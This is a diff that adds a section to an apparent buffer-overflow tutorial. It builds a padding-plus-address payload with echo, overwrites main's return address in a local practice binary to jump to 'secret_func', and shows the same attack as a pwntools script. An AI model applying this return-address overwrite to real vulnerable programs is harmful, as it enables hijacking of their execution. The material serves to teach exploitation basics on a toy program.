@@ -130,6 +130,32 @@ Dump of assembler code for function secret_func:
 
 Now we know that `secret_func` will be place on `0x0000555555555189` address. Due to little endianness we need to write that address reversed. So our payload would look like:
 
+```
+echo -ne "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x89\x51\x55\x55\x55\x55" > payload.txt
+```
+
+And passing the payload to our program would produce:
+
+```
+./example2 < payload.txt
+My secret is: Shhhhh my secret is...
+Segmentation fault
+```
+
+Boooooom we just redirected the flow of execution, that is, `main` was supposed to return somewhere else but we overwrote the return address with `0x555555555189` which is the address of `secret_func`. Therefore when main returned, the instruction pointer (which has the instructions to be executed) executed the instructions of `secret_func`!!!
+
+If we were to do the same but using pwntools, the script would be like:
+
+```python
+from pwn import *
+
+p = process("./example2")
+
+p.sendline(b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x89\x51\x55\x55\x55\x55')
+
+p.interactive()
+```
+
 
 
 
